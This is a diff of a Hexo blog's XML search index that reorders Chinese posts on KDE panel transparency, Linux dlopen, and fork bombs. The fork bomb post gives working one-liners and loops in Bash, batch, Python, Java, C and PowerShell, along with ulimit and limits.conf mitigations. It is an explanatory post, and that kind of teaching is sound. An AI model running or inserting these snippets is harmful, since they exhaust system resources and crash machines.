+<li><a href="https://en.wikipedia.org/wiki/Fork_bomb">https://en.wikipedia.org/wiki/Fork_bomb</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>Others</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -1278,53 +1325,6 @@ set()中可以有两种写法</p>
         <tag>Linux</tag>
         <tag>Github</tag>
         <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Fork bomb命令</title>
-    <url>/fork-bomb-commands/</url>
-    <content><![CDATA[<p><strong>Fork bomb</strong> 是一种拒绝服务攻击，无限 <strong>fork</strong> 子进程以耗尽可用系统资源(CPU占用率高达100%)，由于资源匮乏而导致系统速度放慢或崩溃。</p>
-<span id="more"></span>
-<h3 id="linux-bash"><a class="markdownIt-Anchor" href="#linux-bash"></a> Linux Bash</h3>
-<p>一个最简单的例子 (请在虚拟机上执行！)</p>
-<figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span><span class="hljs-symbol">:</span>()&#123; <span class="hljs-symbol">:|</span><span class="hljs-symbol">:&amp;</span> &#125;;<span class="hljs-symbol">:</span><br></code></pre></div></td></tr></table></figure>
-<ul>
-<li>😦) 定义一个名为 <strong>:</strong> 的函数</li>
-<li>{ … } 函数体</li>
-<li>😐: 递归调用该命令</li>
-<li>&amp; 后台运行，前台运行直接为 <strong>;</strong></li>
-<li>; 分割符</li>
-<li>: 执行名为 <strong>:</strong> 的函数</li>
-</ul>
-<p>执行该命令会创建一个子进程，然后在无限循环中重复自己，不断产生进程，结果是一个无法响应的系统(死机)。</p>
-<h3 id="windows-batch"><a class="markdownIt-Anchor" href="#windows-batch"></a> Windows Batch</h3>
-<p>Windows 批处理同样也可以发生fork bomb。新建一个.bat批处理文件，并添加一下简短的内容</p>
-<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">%</span><span class="bash">0 | %0</span><br></code></pre></div></td></tr></table></figure>
-<h3 id="python"><a class="markdownIt-Anchor" href="#python"></a> Python</h3>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>	os.fork()<br></code></pre></div></td></tr></table></figure>
-<h3 id="java"><a class="markdownIt-Anchor" href="#java"></a> Java</h3>
-<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ForkBomb</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>)<br>    &#123;<br>      Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;javaw&quot;</span>, <span class="hljs-string">&quot;-cp&quot;</span>, System.getProperty(<span class="hljs-string">&quot;java.class.path&quot;</span>), <span class="hljs-string">&quot;ForkBomb&quot;</span>&#125;);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
-<h3 id="c"><a class="markdownIt-Anchor" href="#c"></a> C</h3>
-<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>      fork();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
-<h3 id="powershell"><a class="markdownIt-Anchor" href="#powershell"></a> PowerShell</h3>
-<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-keyword">while</span>(<span class="hljs-variable">$true</span>) &#123; <br>    <span class="hljs-built_in">Start-Process</span> powershell.exe <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;-NoExit&quot;</span>, <span class="hljs-string">&quot;Get-ChildItem -Recurse C:&quot;</span>;<br>    <span class="hljs-built_in">Invoke-Expression</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;while($true) &#123;Start-Process powershell.exe -ArgumentList &quot;-NoExit&quot;, &quot;Get-ChildItem -Recurse C:&quot;&#125;&#x27;</span>;&#125;<br><br></code></pre></div></td></tr></table></figure>
-<h3 id="避免"><a class="markdownIt-Anchor" href="#避免"></a> 避免</h3>
-<p>在Linux下，可以通过 <strong>ulimit</strong> 设置的最大进程数(max user processes)</p>
-<figure class="highlight scss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scss">$ ulimit -<span class="hljs-selector-tag">a</span><br>core file size          (blocks, -c) 0<br>data seg size           (kbytes, -d) unlimited<br>scheduling priority             (-e) 0<br>file size               (blocks, -f) unlimited<br>pending signals                 (-i) 30195<br>max locked memory       (kbytes, -l) 16384<br>max memory size         (kbytes, -m) unlimited<br>open files                      (-n) 1024<br>pipe size            (<span class="hljs-number">512</span> bytes, -p) 8<br>POSIX message queues     (bytes, -q) 819200<br>real-<span class="hljs-selector-tag">time</span> priority              (-r) 0<br>stack size              (kbytes, -s) 8192<br>cpu <span class="hljs-selector-tag">time</span>               (seconds, -t) unlimited<br>max user processes              (-u) 30195<br>virtual memory          (kbytes, -v) unlimited<br>file locks                      (-x) unlimited<br><br></code></pre></div></td></tr></table></figure>
-<p>但是这只能在当前终端生效。因此，还可以修改 <strong>/etc/security/limits.conf</strong> 配置文件</p>
-<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">#<span class="hljs-tag">&lt;<span class="hljs-name">domain</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><br>*               soft    nproc            4096<br></code></pre></div></td></tr></table></figure>
-<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
-<p>参考资料</p>
-<ul>
-<li><a href="https://www.incapsula.com/ddos/attack-glossary/fork-bomb.html">https://www.incapsula.com/ddos/attack-glossary/fork-bomb.html</a></li>
-<li><a href="https://en.wikipedia.org/wiki/Fork_bomb">https://en.wikipedia.org/wiki/Fork_bomb</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>Others</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -1478,6 +1478,39 @@ set()中可以有两种写法</p>
       </tags>
   </entry>
   <entry>
+    <title>KDE Panel透明</title>
+    <url>/kde-panel-transparency/</url>
+    <content><![CDATA[<p>KDE的面板默认是不透明的，可以通过其他的主题达到半透明效果，然而这样还是不美观，因此…</p>
+<span id="more"></span>
+<p>本文主要参考了Manjaro论坛 <a href="https://forum.manjaro.org/t/where-can-the-transparency-of-the-kde-panel-be-set/50219">Where can the transparency of the KDE Panel be set?</a></p>
+<p>未修改，真…丑…<br />
+<img src="/uploads/images/kde_panel/1.png" alt="" /></p>
+<p>KDE Plasma主题一般位于 <code>/usr/share/plasma/desktoptheme</code> 和 <code>$HOME/.local/share/plasma/desktoptheme</code>。</p>
+<p>假如我的主题是<code>McMojave</code>，那么我通过 <code>inkscape</code> 修改svg矢量图形文件 <code>$HOME/.local/share/plasma/desktoptheme/McMojave/widgets/panel-background.svgz</code> 就可以达到全透明效果。</p>
+<p>原图<br />
+<img src="/uploads/images/kde_panel/2.png" alt="" /><br />
+修改(删除)之后<br />
+<img src="/uploads/images/kde_panel/3.png" alt="" /><br />
+或者<br />
+<img src="/uploads/images/kde_panel/4.png" alt="" /><br />
+后者会删除面板边框阴影部分。</p>
+<p>效果<br />
+<img src="/uploads/images/kde_panel/5.png" alt="" /><br />
+<img src="/uploads/images/kde_panel/6.png" alt="" /><br />
+来一张桌面图 ლ(╹◡╹ლ)<br />
+<img src="/uploads/images/kde_panel/7.png" alt="" /></p>
+<p>Bye~</p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Manjaro</tag>
+        <tag>KDE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>安装Linux系统到U盘</title>
     <url>/installed-system-to-usb/</url>
     <content><![CDATA[<p>有时我们想让一个系统随时随地切换到另一台机器上，实现便携式系统。即通过一个U盘启动切换要启动的系统。本文以一个Linux系统安装到U盘为例简单介绍。</p>
@@ -1538,39 +1571,6 @@ U盘： Kingston Datatraveler USB(2.0) / <strong>SanDisk Ultra USB 3.0</strong> 
       </categories>
       <tags>
         <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>KDE Panel透明</title>
-    <url>/kde-panel-transparency/</url>
-    <content><![CDATA[<p>KDE的面板默认是不透明的，可以通过其他的主题达到半透明效果，然而这样还是不美观，因此…</p>
-<span id="more"></span>
-<p>本文主要参考了Manjaro论坛 <a href="https://forum.manjaro.org/t/where-can-the-transparency-of-the-kde-panel-be-set/50219">Where can the transparency of the KDE Panel be set?</a></p>
-<p>未修改，真…丑…<br />
-<img src="/uploads/images/kde_panel/1.png" alt="" /></p>
-<p>KDE Plasma主题一般位于 <code>/usr/share/plasma/desktoptheme</code> 和 <code>$HOME/.local/share/plasma/desktoptheme</code>。</p>
-<p>假如我的主题是<code>McMojave</code>，那么我通过 <code>inkscape</code> 修改svg矢量图形文件 <code>$HOME/.local/share/plasma/desktoptheme/McMojave/widgets/panel-background.svgz</code> 就可以达到全透明效果。</p>
-<p>原图<br />
-<img src="/uploads/images/kde_panel/2.png" alt="" /><br />
-修改(删除)之后<br />
-<img src="/uploads/images/kde_panel/3.png" alt="" /><br />
-或者<br />
-<img src="/uploads/images/kde_panel/4.png" alt="" /><br />
-后者会删除面板边框阴影部分。</p>
-<p>效果<br />
-<img src="/uploads/images/kde_panel/5.png" alt="" /><br />
-<img src="/uploads/images/kde_panel/6.png" alt="" /><br />
-来一张桌面图 ლ(╹◡╹ლ)<br />
-<img src="/uploads/images/kde_panel/7.png" alt="" /></p>
-<p>Bye~</p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>Manjaro</tag>
-        <tag>KDE</tag>
       </tags>
   </entry>
   <entry>
@@ -1698,48 +1698,8 @@ U盘： Kingston Datatraveler USB(2.0) / <strong>SanDisk Ultra USB 3.0</strong> 
         <category>Programming</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>C++</tag>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux dlopen 加载动态链接库</title>
-    <url>/linux-dlopen/</url>
-    <content><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3>
-<p>说到加载库,第一个方法就是包含库的头文件,在编译时通过  加载链接库.第二种方法在运行时用函数来加载链接库,获取其中的函数地址并调用.本文讲述后者</p>
-<span id="more"></span>
-<h3 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h3>
-<p>接触过WindowsAPI的应该知道,静态库后缀为,动态链接库后缀,而主要用到函数</p>
-<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function">HMODULE WINAPI <span class="hljs-title">LoadLibrary</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ LPCTSTR lpFileName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure>
-<p>获取函数地址则是</p>
-<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function">FARPROC WINAPI <span class="hljs-title">GetProcAddress</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ LPCSTR  lpProcName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure>
-<p>MSDN上的例子</p>
-<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-comment">//声明函数指针</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(WINAPI *PGNSI)</span><span class="hljs-params">(LPSYSTEM_INFO)</span></span>;<br><span class="hljs-comment">// Call GetNativeSystemInfo if supported or GetSystemInfo otherwise.</span><br>   PGNSI pGNSI;<br>   SYSTEM_INFO si;<br>   <span class="hljs-built_in">ZeroMemory</span>(&amp;si, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(SYSTEM_INFO));<br>   <br>   pGNSI = (PGNSI) <span class="hljs-built_in">GetProcAddress</span>(<br>      <span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>)), <br>      <span class="hljs-string">&quot;GetNativeSystemInfo&quot;</span>);<br>   <span class="hljs-keyword">if</span>(<span class="hljs-literal">NULL</span> != pGNSI)<br>   &#123;<br>      <span class="hljs-built_in">pGNSI</span>(&amp;si);<br>   &#125;<br>   <span class="hljs-keyword">else</span> <br>   &#123;<br>       <span class="hljs-built_in">GetSystemInfo</span>(&amp;si);<br>   &#125;<br></code></pre></div></td></tr></table></figure>
-<p>由此可看,Windows也实现了对库文件的调用,那么Linux下怎么调用呢?<br />
-关于Linux调用库的头文件可以参考 <a href="https://linux.die.net/man/3/dlopen">https://linux.die.net/man/3/dlopen</a></p>
-<p>必须包含的头文件 <code>dlfcn.h</code><br />
-常用函数:</p>
-<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-comment">//加载链接库</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">dlopen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">int</span> flag)</span></span>;<br><span class="hljs-comment">//返回获取的错误</span><br><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">dlerror</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-comment">//获取链接库函数地址</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">dlsym</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *handle, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *symbol)</span></span>;<br><span class="hljs-comment">//卸载链接库</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dlclose</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *handle)</span></span>;<br></code></pre></div></td></tr></table></figure>
-<p>注意,在编译时,要指明 <strong>-ldl</strong></p>
-<p>除此之外,还有连个也比较有用的函数<strong>dladdr() dlvsym()</strong></p>
-<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-comment">//获取函数的信息</span><br><span class="hljs-comment">//dladdr() returns 0 on error, and nonzero on success</span><br><span class="hljs-comment">//If no symbol matching addr could be found, then dli_sname and dli_saddr are set to NULL</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dladdr</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *addr, Dl_info *info)</span></span>;<br><span class="hljs-function">The function <span class="hljs-title">dladdr</span><span class="hljs-params">()</span> takes a function pointer <span class="hljs-keyword">and</span> tries to resolve name <span class="hljs-keyword">and</span> file where it is located. Information is stored in the Dl_info structure:</span><br><span class="hljs-function">typedef struct &#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *dli_fname;  <span class="hljs-comment">/* Pathname of shared object that</span><br><span class="hljs-comment">                               contains address */</span><br>    <span class="hljs-keyword">void</span>       *dli_fbase;  <span class="hljs-comment">/* Address at which shared object</span><br><span class="hljs-comment">                               is loaded */</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *dli_sname;  <span class="hljs-comment">/* Name of nearest symbol with address</span><br><span class="hljs-comment">                               lower than addr */</span><br>    <span class="hljs-keyword">void</span>       *dli_saddr;  <span class="hljs-comment">/* Exact address of symbol named</span><br><span class="hljs-comment">                               in dli_sname */</span><br>&#125; Dl_info;<br><span class="hljs-comment">//类似dlsym()</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">dlvsym</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *handle, <span class="hljs-keyword">char</span> *symbol, <span class="hljs-keyword">char</span> *version)</span></span>;<br></code></pre></div></td></tr></table></figure>
-<p>下面以一个简单的例子说明</p>
-<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;dlfcn.h&gt;</span> <span class="hljs-comment">//包含的头文件</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LIB_PATH <span class="hljs-meta-string">&quot;./libtest.so&quot;</span></span><br><span class="hljs-comment">//声明函数指针</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*PFUN)</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ,<span class="hljs-keyword">int</span> )</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    PFUN pf=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//加载链接库</span><br>    <span class="hljs-keyword">void</span> *handle=<span class="hljs-built_in">dlopen</span>(LIB_PATH,RTLD_LAZY);<br>    <span class="hljs-keyword">if</span>(handle==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;load library failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">//dlvsym(handle,&quot;add&quot;,&quot;1.0.0&quot;); </span><br>    <span class="hljs-comment">//获取链接库里函数地址</span><br>    <span class="hljs-comment">//方法1,参考网站上的写法</span><br>    <span class="hljs-comment">//*(void**)(&amp;pf)=dlsym(handle,&quot;add&quot;);</span><br>   <br>    <span class="hljs-comment">//方法2,相当与Windows下的 GetProcAddress() 函数.</span><br>    pf=(PFUN)<span class="hljs-built_in">dlsym</span>(handle,<span class="hljs-string">&quot;sub&quot;</span>);<br>    <span class="hljs-keyword">if</span>(pf!=<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-comment">//获取函数地址信息</span><br>        Dl_info info;<br>       <span class="hljs-keyword">int</span> r= <span class="hljs-built_in">dladdr</span>((<span class="hljs-keyword">void</span>*)pf,&amp;info);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;library filepath:%s\n&quot;</span>\<br>                <span class="hljs-string">&quot;address1:0x%08x\n&quot;</span>\<br>                <span class="hljs-string">&quot;funciton name:%s\n&quot;</span>\<br>                <span class="hljs-string">&quot;address2:0x%08x\n\n&quot;</span>,<br>                info.dli_fname,info.dli_fbase,<br>                info.dli_sname,info.dli_saddr);<br>        <span class="hljs-comment">//0 表示失败</span><br>        <span class="hljs-keyword">if</span>(r==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;can not get the dl info...\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;get the function address...\n&quot;</span>);<br>        <span class="hljs-comment">//调用函数</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result: %d \n&quot;</span>,<span class="hljs-built_in">pf</span>(<span class="hljs-number">50</span>,<span class="hljs-number">15</span>));<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;can not get the function address...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//卸载链接库</span><br>    <span class="hljs-built_in">dlclose</span>(handle);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
-<p>生成:<code>g++ test.cpp -o out_test -ldl -rdynamic</code><br />
-运行<code>./out_test</code><br />
-输出结果如下</p>
-<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">library filepath:./libtest.so<br>address1:<span class="hljs-number">0xeabfa000</span><br>funciton name:sub<br>address2:<span class="hljs-number">0xeabfa7f4</span><br>get the function address...<br>result: <span class="hljs-number">35</span><br></code></pre></div></td></tr></table></figure>
-<p>注意上面的库文件<strong><a href="http://libtest.so">libtest.so</a></strong>在当前程序目录下的,代码如下</p>
-<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> _TEST_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _TEST_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> a-b;<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxnum</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> a&gt;b?a:b;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure>
-<p>然后 <code>g++ -fPIC -shared test.cpp -o libtest.so</code>即可生成动态链接库</p>
-]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-      <tags>
         <tag>Linux</tag>
-        <tag>C++</tag>
         <tag>C</tag>
       </tags>
   </entry>
@@ -1887,6 +1847,46 @@ cac-ccc.txt.bz2</p>
       </categories>
       <tags>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux dlopen 加载动态链接库</title>
+    <url>/linux-dlopen/</url>
+    <content><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3>
+<p>说到加载库,第一个方法就是包含库的头文件,在编译时通过  加载链接库.第二种方法在运行时用函数来加载链接库,获取其中的函数地址并调用.本文讲述后者</p>
+<span id="more"></span>
+<h3 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h3>
+<p>接触过WindowsAPI的应该知道,静态库后缀为,动态链接库后缀,而主要用到函数</p>
+<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function">HMODULE WINAPI <span class="hljs-title">LoadLibrary</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_ LPCTSTR lpFileName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure>
+<p>获取函数地址则是</p>
